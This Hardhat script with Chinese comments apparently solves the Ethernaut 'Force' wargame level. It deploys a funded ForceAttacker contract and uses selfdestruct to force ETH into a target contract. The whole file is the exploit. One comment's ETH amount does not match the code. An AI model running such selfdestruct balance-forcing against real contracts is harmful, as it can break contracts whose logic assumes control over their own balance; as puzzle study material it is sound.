import hre from "hardhat";

async function main() {
  // 取得 signer
  const [signer] = await hre.ethers.getSigners();
  
  // 部署 Attack 合約，並在部署時發送 0.001 ETH
  const Attacker = await hre.ethers.getContractFactory("ForceAttacker");
  const attacker = await Attacker.deploy({ 
    value: ethers.parseEther("0.0001") 
  });
  await attacker.waitForDeployment();
  console.log("ForceAttacker 合約部署在: ", await attacker.getAddress());

  // 取得 Force 合約實例
  const forceAddress = "0x8c6D1B88372D83DABB454FBb19F31A267b01A463"; // 替換成你的 Force 合約地址
  console.log("目前 Force 合約地址的餘額: ", await hre.ethers.provider.getBalance(forceAddress));
  
  // 執行攻擊
  // selfdestruct() 在 Cancun 升級後就被丟棄了，並不會刪除合約，但會將合約餘額轉移給指定地址
  const tx = await attacker.attack_bySelfdestruct(forceAddress);
  // 等待交易被確認
  await tx.wait();
  
  // 驗證 Force 合約的餘額
  const balance = await hre.ethers.provider.getBalance(forceAddress);
  console.log("Force 合約餘額: ", hre.ethers.formatEther(balance), "ETH");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });